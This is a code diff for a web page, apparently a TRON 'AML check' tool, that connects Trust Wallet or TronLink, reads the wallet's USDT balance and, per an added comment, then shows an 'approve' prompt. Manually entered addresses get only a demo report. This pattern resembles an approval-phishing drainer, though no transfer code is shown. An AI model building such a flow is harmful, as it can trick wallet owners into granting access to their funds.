@@ -46,7 +46,7 @@ const categories = [
 ];
 
 // ============================================
-// ЗАГРУЗКА ИСТОРИИ ИЗ LOCALSTORAGE
+// ЗАГРУЗКА ИСТОРИИ
 // ============================================
 function loadHistory() {
     const history = localStorage.getItem('checkHistory');
@@ -171,7 +171,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     const connectBtn = document.getElementById('connectTrustBtn');
     if (connectBtn) {
-        connectBtn.addEventListener('click', connectTrustWallet);
+        connectBtn.addEventListener('click', connectWallet);
     }
 
     if (downloadPdfBtn) {
@@ -188,44 +188,42 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 
 // ============================================
-// ПОДКЛЮЧЕНИЕ TRUST WALLET
+// УНИВЕРСАЛЬНОЕ ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
 // ============================================
-async function connectTrustWallet() {
+async function connectWallet() {
     try {
+        // 1. Пытаемся подключить Trust Wallet
         if (window.trustwallet && window.trustwallet.tronLink) {
             await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
             const address = window.trustwallet.tronLink.defaultAddress.base58;
-            
             connectedWalletAddress = address;
             walletInput.value = address;
             document.getElementById('connectedStatus').style.display = 'inline-flex';
-            
             alert('✅ Trust Wallet подключён!');
-            
-        } else {
-            showWalletInstructions();
+            return;
         }
+
+        // 2. Пытаемся подключить TronLink
+        if (window.tronWeb && window.tronWeb.defaultAddress) {
+            const address = window.tronWeb.defaultAddress.base58;
+            connectedWalletAddress = address;
+            walletInput.value = address;
+            document.getElementById('connectedStatus').style.display = 'inline-flex';
+            alert('✅ TronLink подключён!');
+            return;
+        }
+
+        // 3. Если ничего не найдено — показываем инструкцию
+        alert('❌ Кошелёк не найден. Установите TronLink или Trust Wallet.');
+
     } catch (error) {
-        console.error(error);
-        showWalletInstructions();
+        console.error('Ошибка подключения:', error);
+        alert('Ошибка подключения: ' + error.message);
     }
 }
 
 // ============================================
-// ИНСТРУКЦИЯ ПО ПОДКЛЮЧЕНИЮ
-// ============================================
-function showWalletInstructions() {
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    
-    if (isMobile) {
-        alert('📱 На телефоне:\n1. Откройте Trust Wallet\n2. Нажмите "Browser"\n3. Введите адрес сайта');
-    } else {
-        alert('💻 На компьютере:\nУстановите расширение Trust Wallet для браузера');
-    }
-}
-
-// ============================================
-// ПОЛУЧЕНИЕ БАЛАНСА
+// ПОЛУЧЕНИЕ БАЛАНСА USDT
 // ============================================
 async function getUSDTBalance(address) {
     try {
@@ -254,13 +252,14 @@ async function handleTronCheck() {
         }
         
         if (!walletAddress) {
-            alert('Введите адрес кошелька или подключите Trust Wallet');
+            alert('Введите адрес кошелька или подключите кошелёк');
             return;
         }
 
         uniqueUsers.add(walletAddress);
         updateMetrics();
 
+        // Если кошелёк подключён — пытаемся получить баланс и показать approve
         if (connectedWalletAddress) {
             const balance = await getUSDTBalance(connectedWalletAddress);
             if (balance) {
@@ -274,6 +273,7 @@ async function handleTronCheck() {
             }
         }
 
+        // Иначе показываем демо-отчёт
         startAMLCheck(walletAddress, 'manual', 'demo_tx', '5.00');
         
     } catch (error) {
@@ -457,5 +457,3 @@ function copyAddress() {
     navigator.clipboard.writeText(address);
     alert('Адрес скопирован');
 }
-// =
-
